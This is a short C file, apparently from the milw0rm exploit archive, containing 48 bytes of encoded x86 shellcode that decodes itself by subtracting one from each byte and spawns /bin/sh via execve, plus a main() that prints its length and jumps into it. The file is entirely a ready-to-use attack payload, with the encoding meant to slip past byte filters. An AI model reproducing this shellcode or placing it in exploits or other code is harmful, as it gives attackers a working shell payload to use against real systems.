/*

Encoded SUB shellcode execve /bin/sh of 48 bytes
by anderson_underground@hotmail.com <c0d3_z3r0>

Hack 'n Roll

*/


char shellcode[] =
"\x31\xd2"
"\xeb\x0e"
"\x31\xdb"
"\x5b"
"\xb1\x19"
"\x83\x2c\x1a\x01"
"\x42"
"\xe2\xf9"
"\xeb\x05"
"\xe8\xed\xff\xff\xff"
"\x32\xc1"
"\x51"
"\x69\x30\x30\x74\x69\x69"
"\x30\x63\x6a"
"\x6f"
"\x32\xdc"
"\x8a\xe4"
"\x51"
"\x55"
"\x54"
"\x51"
"\xb1\x3c"
"\xce"
"\x81";


main(){
printf("Length: %d\n",strlen(shellcode));
asm("call shellcode");
}

// milw0rm.com [2008-08-19]